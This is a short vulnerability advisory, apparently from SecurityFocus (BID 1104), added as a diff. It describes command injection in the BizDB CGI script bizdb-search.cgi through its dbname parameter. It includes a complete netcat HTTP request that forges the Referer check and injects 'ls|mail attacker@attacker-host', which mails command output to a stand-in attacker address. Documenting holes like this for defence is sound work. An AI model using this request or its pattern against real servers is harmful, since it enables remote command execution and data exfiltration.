@@ -1,0 +1,19 @@
+source: http://www.securityfocus.com/bid/1104/info
+
+BizDB is a web databse integration product using perl CGI scripts. One of the scripts, bizdb-search.cgi, passes a variable's contents to an unchecked open() call and can therefore be made to execute commands at the privilege level of the webserver.
+
+The variable is dbname, and if passed a semicolon followed by shell commands they will be executed. This cannot be exploited from a browser, as the software checks for a referrer field in the HTTP request. A valid referrer field can however be created and sent programmatically or via a network utility like netcat. 
+
+
+The following netcat session will cause a copy of the output of the ls command to be mailed to attacker@attacker-host
+
+netcat target 80
+GET
+/cgi-bin/bizdb1-search.cgi?template=bizdb-summary&dbname=;ls|mail%20attacker@attacker-host|&f6=^a.*&action=searchdbdisplay
+HTTP/1.0
+Host: target
+Referer: http://target/cgi-bin/bizdb1-search.cgi?bizdb-search
+(empty line)
+(End of Input)
+
+
